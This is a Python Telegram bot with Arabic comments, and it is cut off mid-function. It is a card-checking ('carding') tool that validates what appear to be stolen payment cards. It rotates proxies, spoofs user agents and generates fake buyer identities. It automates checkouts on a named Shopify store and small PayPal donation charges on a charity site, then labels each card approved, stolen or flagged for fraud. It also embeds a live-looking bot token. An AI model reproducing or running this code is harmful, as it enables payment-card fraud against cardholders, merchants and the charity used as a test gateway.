# -*- coding: utf-8 -*-
import telebot,os
import tele
import re,json
from user_agent import *
import requests
import telebot,time,random
import random
import string
from telebot import types
#from file import *
#from reg import reg
from datetime import datetime, timedelta
from faker import Faker
from multiprocessing import Process
import threading
from bs4 import BeautifulSoup
import base64, cloudscraper, urllib3
from requests_toolbelt.multipart.encoder import MultipartEncoder
import jwt
from fake_useragent import UserAgent
import asyncio
import httpx
from urllib.parse import urlparse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# استيراد المكتبات الإضافية
from colorama import Fore, Back, Style, init
init(autoreset=True)

stopuser = {}
stop_event = threading.Event()
token = '8497870641:AAHIa3XwV-NVXpc_Xe3s3z8e8-kMaCcpgNQ'
bot = telebot.TeleBot(token, parse_mode="HTML")
admin = 6412237788
command_usage = {}

# ملف تخزين إعدادات المبالغ لكل مستخدم
AMOUNT_FILE = 'user_amounts.json'
# ملف تخزين الأكواد المستخدمة
USED_CODES_FILE = 'used_codes.json'

def load_user_amounts():
    try:
        with open(AMOUNT_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_user_amounts(amounts):
    with open(AMOUNT_FILE, 'w') as f:
        json.dump(amounts, f, indent=4)

def get_user_amount(user_id):
    amounts = load_user_amounts()
    return amounts.get(str(user_id), "1.00")

def set_user_amount(user_id, amount):
    amounts = load_user_amounts()
    amounts[str(user_id)] = amount
    save_user_amounts(amounts)

# دوال إدارة الأكواد المستخدمة
def load_used_codes():
    try:
        with open(USED_CODES_FILE, 'r') as f:
            return json.load(f)
    except:
        return {"used_codes": []}

def save_used_codes(used_codes):
    with open(USED_CODES_FILE, 'w') as f:
        json.dump(used_codes, f, indent=4)

def is_code_used(code):
    used = load_used_codes()
    return code in used.get("used_codes", [])

def mark_code_as_used(code):
    used = load_used_codes()
    if "used_codes" not in used:
        used["used_codes"] = []
    used["used_codes"].append(code)
    save_used_codes(used)

def reset_command_usage():
    for user_id in command_usage:
        command_usage[user_id] = {'count': 0, 'last_time': None}

# ================== Proxy Management ==================
def load_proxies():
    """تحميل البروكسيات من ملف"""
    try:
        with open('proxies.txt', 'r') as f:
            proxies = f.read().splitlines()
        return [p.strip() for p in proxies if p.strip()]
    except:
        return []

def get_random_proxy():
    """جلب بروكسي عشوائي"""
    proxies = load_proxies()
    if not proxies:
        return None
    return random.choice(proxies)

def format_proxy(proxy_str):
    """تنسيق البروكسي للاستخدام في الطلبات"""
    parts = proxy_str.split(':')
    if len(parts) == 4:
        # proxy: ip:port:username:password
        ip, port, username, password = parts
        proxy_url = f"http://{username}:{password}@{ip}:{port}"
        return {
            'http': proxy_url,
            'https': proxy_url
        }
    elif len(parts) == 2:
        # proxy: ip:port
        ip, port = parts
        proxy_url = f"http://{ip}:{port}"
        return {
            'http': proxy_url,
            'https': proxy_url
        }
    return None

def get_httpx_proxy():
    """تنسيق البروكسي لاستخدام مع httpx"""
    proxy_str = get_random_proxy()
    if not proxy_str:
        return None
    parts = proxy_str.split(':')
    if len(parts) == 4:
        ip, port, username, password = parts
        return f"http://{username}:{password}@{ip}:{port}"
    elif len(parts) == 2:
        ip, port = parts
        return f"http://{ip}:{port}"
    return None

# ================== BIN Info Function ==================
def get_bin_info(bin):
    try:
        url = "https://transfunnel.io/projects/chargeback/bin_check.php"
        payload = "{\"bin_number\":\""+str(bin)+"\"}"
        headers = {'User-Agent': str(generate_user_agent())}
        response = requests.post(url, data=payload, headers=headers)
        info = response.json()["results"]
        brand = info['cardBrand']
        card_type = info["cardType"]
        card_cat = info["cardCat"]
        bank = info["issuingBank"]
        country = info["countryName"]
        country_code = info["countryA2"]
        
        bin_info = f"{brand} - {card_type} - {card_cat}"
        return bin_info, bank, country, country_code
    except:
        return "𝗨𝗡𝗞𝗡𝗢𝗪𝗡", "𝗨𝗡𝗞𝗡𝗢𝗪𝗡", "𝗨𝗡𝗞𝗡𝗢𝗪𝗡", "𝗨𝗡"

# ================== دالة معلومات BIN إضافية لـ Stripe ==================
def dato(bin6):
    try:
        api_url = requests.get("https://bins.antipublic.cc/bins/"+bin6).json()
        brand = api_url["brand"]
        card_type = api_url["type"]
        level = api_url["level"]
        bank = api_url["bank"]
        country_name = api_url["country_name"]
        country_flag = api_url["country_flag"]
        mn = f'''• BIN Info : {brand} - {card_type} - {level}
• Bank : {bank} - {country_flag}
• Country : {country_name} [ {country_flag} ]'''
        return mn
    except:
        return 'No info'

# ================== دالة مساعدة للبحث بين النصوص ==================
def find_between(s, start, end):
    try:
        if start in s and end in s:
            return (s.split(start))[1].split(end)[0]
        return ""
    except:
        return ""

# ================== Shopify Gateway Class (مُصحح) ==================
class ShopifyAuto:
    def __init__(self, use_proxy=True):
        self.user_agent = UserAgent().random
        self.last_price = None
        self.use_proxy = use_proxy
        self.proxy_str = get_httpx_proxy() if use_proxy else None
        if self.proxy_str:
            print(f"✅ Shopify using proxy: {self.proxy_str.split('@')[-1] if '@' in self.proxy_str else self.proxy_str}")

    async def tokenize_card(self, session, cc, mon, year, cvv, first, last):
        """Tokenize card via Shopify Deposit Vault"""
        try:
            url = "https://deposit.us.shopifycs.com/sessions"
            payload = {
                "credit_card": {
                    "number": str(cc).replace(" ", ""),
                    "name": f"{first} {last}",
                    "month": int(mon),
                    "year": int(year),
                    "verification_value": str(cvv)
                }
            }
            headers = {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Origin': 'https://checkout.shopifycs.com',
                'User-Agent': self.user_agent
            }
            r = await session.post(url, json=payload, headers=headers)
            if r.status_code == 200:
                return r.json().get('id')
            else:
                return None
        except Exception as e:
            return None

    async def get_random_info(self):
        """Get random user info with VALID addresses"""
        us_addresses = [
            {"add1": "123 Main St", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04101"},
            {"add1": "456 Oak Ave", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04102"},
            {"add1": "789 Pine Rd", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04103"},
            {"add1": "321 Elm St", "city": "Bangor", "state": "Maine", "state_short": "ME", "zip": "04401"},
            {"add1": "654 Maple Dr", "city": "Lewiston", "state": "Maine", "state_short": "ME", "zip": "04240"}
        ]
        
        address = random.choice(us_addresses)
        first_name = random.choice(["John", "Emily", "Alex", "Sarah", "Michael", "Jessica", "David", "Lisa"])
        last_name = random.choice(["Smith", "Johnson", "Williams", "Brown", "Garcia", "Miller", "Davis"])
        email = f"{first_name.lower()}.{last_name.lower()}{random.randint(1, 999)}@gmail.com"
        
        valid_phones = [
            "2025550199", "3105551234", "4155559876", "6175550123",
            "9718081573", "2125559999", "7735551212", "4085556789"
        ]
        phone = random.choice(valid_phones)
        
        return {
            "fname": first_name,
            "lname": last_name,
            "email": email,
            "phone": phone,
            "add1": address["add1"],
            "city": address["city"],
            "state": address["state"],
            "state_short": address["state_short"],
            "zip": address["zip"]
        }

async def shopify_gate(card, site_url="https://restockar.com/"):
    """
    دالة بوابة Shopify (مُصححة)
    """
    try:
        cc, mon, year, cvv = card.split('|')
        if "20" in year:
            year = year.split("20")[1]
    except:
        return "Invalid card format"
    
    # محاولتين كحد أقصى
    max_attempts = 2
    for attempt in range(max_attempts):
        try:
            # إعداد البروكسي بالطريقة الصحيحة
            shop = ShopifyAuto(use_proxy=(attempt == 0))
            
            # إنشاء client مع أو بدون بروكسي
            client_params = {
                'follow_redirects': True,
                'timeout': 30.0
            }
            
            # إضافة البروكسي إذا كان موجود (للإصدارات الحديثة من httpx)
            if shop.proxy_str:
                client_params['proxies'] = shop.proxy_str
            
            async with httpx.AsyncClient(**client_params) as session:
                
                product_header = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'accept-language': 'en-US,en;q=0.6',
                    'user-agent': shop.user_agent,
                }

                # الحصول على معلومات المنتج
                try:
                    product_response = await session.get(site_url + '/products.json', headers=product_header)
                    products_data = product_response.json()
                    product = products_data['products'][0]
                    product_handle = product['handle']
                    variant_id = product['variants'][0]['id']
                    price = product['variants'][0]['price']
                except Exception as e:
                    if attempt < max_attempts - 1:
                        await asyncio.sleep(2)
                        continue
                    return f"Failed to get product info: {str(e)[:30]}"

                # إضافة المنتج للسلة
                await session.get(site_url + '/cart.js', headers=product_header)

                add_data = {
                    'id': str(variant_id),
                    'quantity': '1',
                    'form_type': 'product',
                }

                response = await session.post(site_url + '/cart/add.js', headers=product_header, data=add_data)
                
                if response.status_code != 200:
                    if attempt < max_attempts - 1:
                        await asyncio.sleep(2)
                        continue
                    return "Failed to add item to cart"

                # الحصول على معلومات السلة
                cart_response = await session.get(f"{site_url}/cart.js", headers=product_header)
                cart_data = cart_response.json()
                token = cart_data['token']

                # الذهاب لصفحة الدفع
                checkout_headers = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': site_url,
                    'referer': f"{site_url}/cart",
                    'upgrade-insecure-requests': '1',
                    'user-agent': product_header['user-agent'],
                }
                
                await session.get(f"{site_url}/checkout", headers=checkout_headers)
                
                checkout_data = {
                    'checkout': '',
                    'updates[]': '1',
                }
                
                checkout_response = await session.post(f"{site_url}/cart", headers=checkout_headers, data=checkout_data)
                response_text2 = checkout_response.text

                # استخراج التوكنات
                x_checkout_one_session_token = re.search(
                    r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"', 
                    response_text2
                )

                session_token = None
                if x_checkout_one_session_token:
                    session_token = x_checkout_one_session_token.group(1)

                queue_token = find_between(response_text2, 'queueToken&quot;:&quot;', '&quot;')
                stable_id = find_between(response_text2, 'stableId&quot;:&quot;', '&quot;')
                paymentMethodIdentifier = find_between(response_text2, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')

                if not all([session_token, queue_token, stable_id, paymentMethodIdentifier]):
                    if attempt < max_attempts - 1:
                        await asyncio.sleep(2)
                        continue
                    return "Failed to extract checkout tokens"

                await asyncio.sleep(1)

                # إنشاء معلومات عشوائية
                random_info = await shop.get_random_info()
                fname = random_info["fname"]
                lname = random_info["lname"]
                email = random_info["email"]
                phone = random_info["phone"]
                add1 = random_info["add1"]
                city = random_info["city"]
                state_short = random_info["state_short"]
                zip_code = str(random_info["zip"])

                # إنشاء جلسة دفع
                session_endpoints = [
                    "https://deposit.us.shopifycs.com/sessions",
                    "https://checkout.pci.shopifyinc.com/sessions",
                    "https://checkout.shopifycs.com/sessions"
                ]
                        
                session_created = False
                sessionid = None
                        
                for endpoint in session_endpoints:
                    try:
                        headers = {
                            'authority': urlparse(endpoint).netloc,
                            'accept': 'application/json',
                            'content-type': 'application/json',
                            'origin': 'https://checkout.shopifycs.com',
                            'referer': 'https://checkout.shopifycs.com/',
                            'user-agent': shop.user_agent,
                        }

                        json_data = {  
                            'credit_card': {
                                'number': cc,
                                'month': mon,
                                'year': year,
                                'verification_value': cvv,
                                'name': fname + ' ' + lname,
                            },
                            'payment_session_scope': urlparse(site_url).netloc,
                        }

                        session_response = await session.post(endpoint, headers=headers, json=json_data)
                                
                        if session_response.status_code == 200:
                            session_data = session_response.json()
                            if "id" in session_data:
                                sessionid = session_data["id"]
                                session_created = True
                                break
                    except:
                        continue

                if not session_created:
                    if attempt < max_attempts - 1:
                        await asyncio.sleep(2)
                        continue
                    return "Failed to create payment session"

                await asyncio.sleep(1)

                # إرسال طلب GraphQL
                graphql_url = f"{site_url}/checkouts/unstable/graphql"
                
                random_page_id = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(100000000000, 999999999999):012X}"

                graphql_headers = {
                    'authority': urlparse(site_url).netloc,
                    'accept': 'application/json',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/json',
                    'origin': site_url,
                    'referer': f"{site_url}/",
                    'user-agent': shop.user_agent,
                    'x-checkout-one-session-token': session_token,
                    'x-checkout-web-deploy-stage': 'production',
                    'x-checkout-web-server-handling': 'fast',
                    'x-checkout-web-source-id': token,
                }

                graphql_payload = {
                    'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}',
                    'variables': {
                        'input': {
                            'checkpointData': None,
                            'sessionInput': {
                                'sessionToken': session_token,
                            },
                            'queueToken': queue_token,
                            'discounts': {
                                'lines': [],
                                'acceptUnexpectedDiscounts': True,
                            },
                            'delivery': {
                                'deliveryLines': [
                                    {
                                        'selectedDeliveryStrategy': {
                                            'deliveryStrategyMatchingConditions': {
                                                'estimatedTimeInTransit': {'any': True},
                                                'shipments': {'any': True},
                                            },
                                            'options': {},
                                        },
                                        'targetMerchandiseLines': {
                                            'lines': [{'stableId': stable_id}],
                                        },
                                        'destination': {
                                            'streetAddress': {
                                                'address1': add1,
                                                'address2': '',
                                                'city': city,
                                                'countryCode': 'US',
                                                'postalCode': zip_code,
                                                'company': '',
                                                'firstName': fname,
                                                'lastName': lname,
                                                'zoneCode': state_short,
                                                'phone': phone,
                                            },
                                        },
                                        'deliveryMethodTypes': ['SHIPPING'],
                                        'expectedTotalPrice': {'any': True},
                                        'destinationChanged': True,
                                    },
                                ],
                                'noDeliveryRequired': [],
                                'useProgressiveRates': False,
                                'prefetchShippingRatesStrategy': None,
                            },
                            'merchandise': {
                                'merchandiseLines': [
                                    {
                                        'stableId': stable_id,
                                        'merchandise': {
                                            'productVariantReference': {
                                                'id': f'gid://shopify/ProductVariantMerchandise/{variant_id}',
                                                'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                                'properties': [],
                                                'sellingPlanId': None,
                                                'sellingPlanDigest': None,
                                            },
                                        },
                                        'quantity': {'items': {'value': 1}},
                                        'expectedTotalPrice': {'any': True},
                                        'lineComponentsSource': None,
                                        'lineComponents': [],
                                    },
                                ],
                            },
                            'payment': {
                                'totalAmount': {'any': True},
                                'paymentLines': [
                                    {
                                        'paymentMethod': {
                                            'directPaymentMethod': {
                                                'paymentMethodIdentifier': paymentMethodIdentifier,
                                                'sessionId': sessionid,
                                                'billingAddress': {
                                                    'streetAddress': {
                                                        'address1': add1,
                                                        'address2': '',
                                                        'city': city,
                                                        'countryCode': 'US',
                                                        'postalCode': zip_code,
                                                        'company': '',
                                                        'firstName': fname,
                                                        'lastName': lname,
                                                        'zoneCode': state_short,
                                                        'phone': phone,
                                                    },
                                                },
                                                'cardSource': None,
                                            },
                                        },
                                        'amount': {'any': True},
                                        'dueAt': None,
                                    },
                                ],
                                'billingAddress': {
                                    'streetAddress': {
                                        'address1': add1,
                                        'address2': '',
                                        'city': city,
                                        'countryCode': 'US',
                                        'postalCode': zip_code,
                                        'company': '',
                                        'firstName': fname,
                                        'lastName': lname,
                                        'zoneCode': state_short,
                                        'phone': phone,
                                    },
                                },
                            },
                            'buyerIdentity': {
                                'buyerIdentity': {
                                    'presentmentCurrency': 'USD',
                                    'countryCode': 'US',
                                },
                                'contactInfoV2': {
                                    'emailOrSms': {
                                        'value': email,
                                        'emailOrSmsChanged': False,
                                    },
                                },
                                'marketingConsent': [{'email': {'value': email}}],
                                'shopPayOptInPhone': {'countryCode': 'US'},
                            },
                            'tip': {'tipLines': []},
                            'taxes': {
                                'proposedAllocations': None,
                                'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': 'USD'}},
                                'proposedTotalIncludedAmount': None,
                                'proposedMixedStateTotalAmount': None,
                                'proposedExemptions': [],
                            },
                            'note': {'message': None, 'customAttributes': []},
                            'localizationExtension': {'fields': []},
                            'nonNegotiableTerms': None,
                            'scriptFingerprint': {
                                'signature': None,
                                'signatureUuid': None,
                                'lineItemScriptChanges': [],
                                'paymentScriptChanges': [],
                                'shippingScriptChanges': [],
                            },
                            'optionalDuties': {'buyerRefusesDuties': False},
                        },
                        'attemptToken': f'{token}-{random.random()}',
                        'metafields': [],
                        'analytics': {
                            'requestUrl': f'{site_url}/checkouts/cn/{token}',
                            'pageId': random_page_id,
                        },
                    },
                    'operationName': 'SubmitForCompletion',
                }

                graphql_response = await session.post(graphql_url, headers=graphql_headers, json=graphql_payload)
                
                if graphql_response.status_code == 200:
                    result_data = graphql_response.json()
                    
                    completion = result_data.get('data', {}).get('submitForCompletion', {})
                    
                    if completion.get('__typename') == 'SubmitRejected':
                        errors = completion.get('errors', [])
                        if errors:
                            error_codes = [e.get('code', 'UNKNOWN') for e in errors]
                            if any(code in ['CVV2_FAILURE', 'DO_NOT_HONOR'] for code in error_codes):
                                return "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌"
                            else:
                                return f"𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱: {', '.join(error_codes)} ❌"
                    
                    elif completion.get('__typename') == 'SubmitFailed':
                        return f"𝗙𝗮𝗶𝗹𝗲𝗱: {completion.get('reason', 'Unknown')} ❌"
                    
                    elif completion.get('__typename') == 'Throttled':
                        pass
                    
                    receipt = completion.get('receipt', {})
                    if receipt:
                        if receipt.get('__typename') == 'ProcessedReceipt':
                            return "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
                        elif receipt.get('__typename') == 'ActionRequiredReceipt':
                            return "𝟯𝗗𝗦 𝗥𝗲𝗾𝘂𝗶𝗿𝗲𝗱 ⚠️"
                        elif receipt.get('__typename') == 'FailedReceipt':
                            error = receipt.get('processingError', {})
                            if error:
                                return f"𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱: {error.get('code', 'Unknown')} ❌"
                    
                    # إذا وصلنا لهنا، نحاول نتحقق من النتيجة النهائية
                    checkout_url_final = f"{site_url}/checkout?from_processing_page=1&validate=true"
                    final_response = await session.get(checkout_url_final)
                    final_url = str(final_response.url)
                    
                    if "/thank" in final_url.lower() or "/orders/" in final_url.lower():
                        return "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
                    else:
                        return "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌"
                
                if attempt < max_attempts - 1:
                    await asyncio.sleep(2)
                    continue
                return "𝗙𝗮𝗶𝗹𝗲𝗱 𝘁𝗼 𝗽𝗿𝗼𝗰𝗲𝘀𝘀 𝗽𝗮𝘆𝗺𝗲𝗻𝘁 ❌"
                        
        except Exception as e:
            if attempt < max_attempts - 1:
                await asyncio.sleep(2)
                continue
            return f"𝗘𝗿𝗿𝗼𝗿: {str(e)[:50]}"
    
    return "𝗘𝗿𝗿𝗼𝗿: 𝗔𝗹𝗹 𝗮𝘁𝘁𝗲𝗺𝗽𝘁𝘀 𝗳𝗮𝗶𝗹𝗲𝗱 ❌"

def run_async_shopify(card):
    """تشغيل الدالة غير المتزامنة بشكل متزامن"""
    try:
        # إنشاء event loop جديد
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(shopify_gate(card))
        loop.close()
        return result
    except Exception as e:
        return f"𝗘𝗿𝗿𝗼𝗿: {str(e)[:50]}"

# ================== PayPal Gateway (Drgam) with Proxy ==================
def paypal_gate_drgam(ccx, amount="1.00"):
    """
    بوابة PayPal Drgam
    """
    ccx = ccx.strip()
    parts = ccx.split("|")
    if len(parts) < 4:
        return "Invalid card format"
    
    n = parts[0]
    mm = parts[1]
    yy = parts[2]
    cvc = parts[3].strip()
    if "20" in yy:
        yy = yy.split("20")[1]
    
    # معالجة المبلغ
    try:
        amount_float = float(amount)
        if amount_float < 0.01:
            amount = "0.01"
        elif amount_float > 5.00:
            amount = "5.00"
        else:
            amount = f"{amount_float:.2f}"
    except:
        amount = "1.00"
    
    # محاولتين كحد أقصى
    max_attempts = 2
    for attempt in range(max_attempts):
        r = requests.Session()
        r.verify = False
        
        # إضافة بروكسي عشوائي في المحاولة الأولى فقط
        if attempt == 0:
            proxy_str = get_random_proxy()
            proxy_dict = format_proxy(proxy_str) if proxy_str else None
            if proxy_dict:
                r.proxies.update(proxy_dict)
                print(f"✅ PayPal Drgam using proxy: {proxy_str.split(':')[0] if proxy_str else 'None'}")
        
        user = generate_user_agent()
        
        try:
            # زيارة صفحة الدفع
            response = r.get('https://iasfund.org/donations/donate', cookies=r.cookies, headers={'user-agent': user}, timeout=15)
            
            # استخراج البيانات
            id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text).group(1)
            id_form2 = re.search(r'name="give-form-id" value="(.*?)"', response.text).group(1)
            nonec = re.search(r'name="give-form-hash" value="(.*?)"', response.text).group(1)
            enc = re.search(r'"data-client-token":"(.*?)"', response.text).group(1)
            
            dec = base64.b64decode(enc).decode('utf-8')
            au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
            
            # طلب AJAX أولي
            headers_ajax = {
                'origin': 'https://iasfund.org',
                'referer': 'https://iasfund.org/donations/donate',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }
            
            data_ajax = {
                'give-honeypot': '',
                'give-form-id-prefix': id_form1,
                'give-form-id': id_form2,
                'give-form-title': '',
                'give-current-url': 'https://iasfund.org/donations/donate',
                'give-form-url': 'https://iasfund.org/donations/donate',
                'give-form-minimum': amount,
                'give-form-maximum': '999999.99',
                'give-form-hash': nonec,
                'give-price-id': '3',
                'give-recurring-logged-in-only': '',
                'give-logged-in-only': '1',
                '_give_is_donation_recurring': '0',
                'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
                'give-amount': amount,
                'give_stripe_payment_method': '',
                'payment-mode': 'paypal-commerce',
                'give_first': 'DRGAM',
                'give_last': 'rights and',
                'give_email': 'drgam22@gmail.com',
                'card_name': 'drgam',
                'card_exp_month': '',
                'card_exp_year': '',
                'give_action': 'purchase',
                'give-gateway': 'paypal-commerce',
                'action': 'give_process_donation',
                'give_ajax': 'true',
            }
            
            r.post('https://iasfund.org/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers_ajax, data=data_ajax, timeout=10)
            
            # إنشاء MultipartEncoder لطلب إنشاء الطلب
            data_multipart = MultipartEncoder({
                'give-honeypot': (None, ''),
                'give-form-id-prefix': (None, id_form1),
                'give-form-id': (None, id_form2),
                'give-form-title': (None, ''),
                'give-current-url': (None, 'https://iasfund.org/donations/donate'),
                'give-form-url': (None, 'https://iasfund.org/donations/donate'),
                'give-form-minimum': (None, amount),
                'give-form-maximum': (None, '999999.99'),
                'give-form-hash': (None, nonec),
                'give-price-id': (None, '3'),
                'give-recurring-logged-in-only': (None, ''),
                'give-logged-in-only': (None, '1'),
                '_give_is_donation_recurring': (None, '0'),
                'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
                'give-amount': (None, amount),
                'give_stripe_payment_method': (None, ''),
                'payment-mode': (None, 'paypal-commerce'),
                'give_first': (None, 'DRGAM'),
                'give_last': (None, 'rights and'),
                'give_email': (None, 'drgam22@gmail.com'),
                'card_name': (None, 'drgam'),
                'card_exp_month': (None, ''),
                'card_exp_year': (None, ''),
                'give-gateway': (None, 'paypal-commerce'),
            })
            
            headers_multipart = {
                'content-type': data_multipart.content_type,
                'origin': 'https://iasfund.org',
                'referer': 'https://iasfund.org/donations/donate',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            }
            
            params_create = {
                'action': 'give_paypal_commerce_create_order',
            }
            
            response_create = r.post(
                'https://iasfund.org/wp-admin/admin-ajax.php',
                params=params_create,
                cookies=r.cookies,
                headers=headers_multipart,
                data=data_multipart,
                timeout=10
            )
            
            response_json = response_create.json()
            if 'data' not in response_json or 'id' not in response_json['data']:
                if attempt < max_attempts - 1:
                    continue
                return "Failed to create order"
            
            tok = response_json['data']['id']
            
            # تأكيد مصدر الدفع مع PayPal
            headers_paypal = {
                'authority': 'cors.api.paypal.com',
                'accept': '*/*',
                'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en-US;q=0.7,en;q=0.6',
                'authorization': f'Bearer {au}',
                'braintree-sdk-version': '3.32.0-payments-sdk-dev',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835',
                'referer': 'https://assets.braintreegateway.com/',
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': generate_user_agent(),
            }
            
            json_data_paypal = {
                'payment_source': {
                    'card': {
                        'number': n,
                        'expiry': f'20{yy}-{mm}',
                        'security_code': cvc,
                        'attributes': {
                            'verification': {
                                'method': 'SCA_WHEN_REQUIRED',
                            },
                        },
                    },
                },
                'application_context': {
                    'vault': False,
                },
            }
            
            response_paypal = r.post(
                f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source',
                headers=headers_paypal,
                json=json_data_paypal,
                timeout=10
            )
            
            # الموافقة النهائية على الطلب
            data_approve = MultipartEncoder({
                'give-honeypot': (None, ''),
                'give-form-id-prefix': (None, id_form1),
                'give-form-id': (None, id_form2),
                'give-form-title': (None, ''),
                'give-current-url': (None, 'https://iasfund.org/donations/donate'),
                'give-form-url': (None, 'https://iasfund.org/donations/donate'),
                'give-form-minimum': (None, amount),
                'give-form-maximum': (None, '999999.99'),
                'give-form-hash': (None, nonec),
                'give-price-id': (None, '3'),
                'give-recurring-logged-in-only': (None, ''),
                'give-logged-in-only': (None, '1'),
                '_give_is_donation_recurring': (None, '0'),
                'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
                'give-amount': (None, amount),
                'give_stripe_payment_method': (None, ''),
                'payment-mode': (None, 'paypal-commerce'),
                'give_first': (None, 'DRGAM'),
                'give_last': (None, 'rights and'),
                'give_email': (None, 'drgam22@gmail.com'),
                'card_name': (None, 'drgam'),
                'card_exp_month': (None, ''),
                'card_exp_year': (None, ''),
                'give-gateway': (None, 'paypal-commerce'),
            })
            
            headers_approve = {
                'content-type': data_approve.content_type,
                'origin': 'https://iasfund.org',
                'referer': 'https://iasfund.org/donations/donate',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            }
            
            params_approve = {
                'action': 'give_paypal_commerce_approve_order',
                'order': tok,
            }
            
            response_approve = r.post(
                'https://iasfund.org/wp-admin/admin-ajax.php',
                params=params_approve,
                cookies=r.cookies,
                headers=headers_approve,
                data=data_approve,
                timeout=10
            )
            
            text = response_approve.text
            
            # معالجة النتائج
            if 'true' in text or 'sucsess' in text:
                return "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
            elif 'DO_NOT_HONOR' in text:
                return "𝗗𝗼 𝗻𝗼𝘁 𝗵𝗼𝗻𝗼𝗿 ❌"
            elif 'ACCOUNT_CLOSED' in text or 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:
                return "𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗰𝗹𝗼𝘀𝗲𝗱 ❌"
            elif 'LOST_OR_STOLEN' in text:
                return "𝗟𝗢𝗦𝗧 𝗢𝗥 𝗦𝗧𝗢𝗟𝗘𝗡 ❌"
            elif 'CVV2_FAILURE' in text:
                return "𝗖𝗮𝗿𝗱 𝗜𝘀𝘀𝘂𝗲𝗿 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 𝗖𝗩𝗩 ⚠️"
            elif 'SUSPECTED_FRAUD' in text:
                return "𝗦𝗨𝗦𝗣𝗘𝗖𝗧𝗘𝗗 𝗙𝗥𝗔𝗨𝗗 ❌"
            elif 'INVALID_ACCOUNT' in text:
                return '𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 ❌'
            elif 'REATTEMPT_NOT_PERMITTED' in text:
